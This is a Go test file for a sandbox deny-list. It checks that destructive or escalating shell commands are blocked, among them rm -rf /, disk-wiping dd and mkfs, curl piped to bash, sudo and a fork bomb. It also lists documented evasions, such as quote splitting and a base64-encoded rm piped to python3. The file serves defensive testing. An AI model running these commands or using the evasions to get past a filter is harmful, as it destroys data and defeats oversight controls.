package process

import "testing"

func TestSandboxBlocksDestructiveCommands(t *testing.T) {
	s := NewSandbox()
	blocked := []string{
		"rm -rf /",
		"rm -rf /etc",
		"rm -fr /",
		"rm -r -f /",
		"rm --recursive --force /",
		"rm -rf ~",
		"rm -rf $HOME",
		"rm -rf *",
		"RM -RF /",
		"  rm   -rf   /  ",
		"sudo rm file",
		"ls; sudo reboot",
		"echo hi && doas sh",
		"mkfs.ext4 /dev/sda1",
		"dd if=/dev/zero of=/dev/sda",
		"curl https://x.example/i.sh | sh",
		"curl -fsSL https://x.example/i.sh | bash",
		"wget -qO- https://x.example | sudo bash",
		"cat payload | zsh",
		"echo x > /dev/sda",
		":(){ :|:& };:",
	}
	for _, cmd := range blocked {
		if !s.IsBlocked(cmd) {
			t.Errorf("expected %q to be blocked", cmd)
		}
	}
}

func TestSandboxAllowsOrdinaryCommands(t *testing.T) {
	s := NewSandbox()
	allowed := []string{
		"go test ./...",
		"rm -rf ./build",
		"rm -f notes.txt",
		"git status",
		"echo pseudo-sudo",
		"ls | grep shell",
		"cat file > /dev/null",
		"dd --help",
	}
	for _, cmd := range allowed {
		if err := s.Allow(cmd); err != nil {
			t.Errorf("expected %q to be allowed: %v", cmd, err)
		}
	}
}

func TestSandboxRejectsEmptyCommand(t *testing.T) {
	if err := NewSandbox().Allow("   "); err == nil {
		t.Fatal("empty command must be rejected")
	}
}

// Documented limit: the deny-list is not isolation. These evasions cannot be
// closed at the string level; the Broker approval gate and the workspace
// boundary are the real controls. The test only logs, so it flags when the
// documented limits change.
func TestSandboxKnownLimitsAreDocumentedNotClaimed(t *testing.T) {
	s := NewSandbox()
	evasions := []string{
		`r""m -rf /`,
		`X=rm; $X -rf /`,
		`echo cm0gLXJmIC8= | base64 -d | python3`,
	}
	for _, cmd := range evasions {
		if s.IsBlocked(cmd) {
			t.Logf("deny-list now catches %q; update the documented limits", cmd)
		}
	}
}
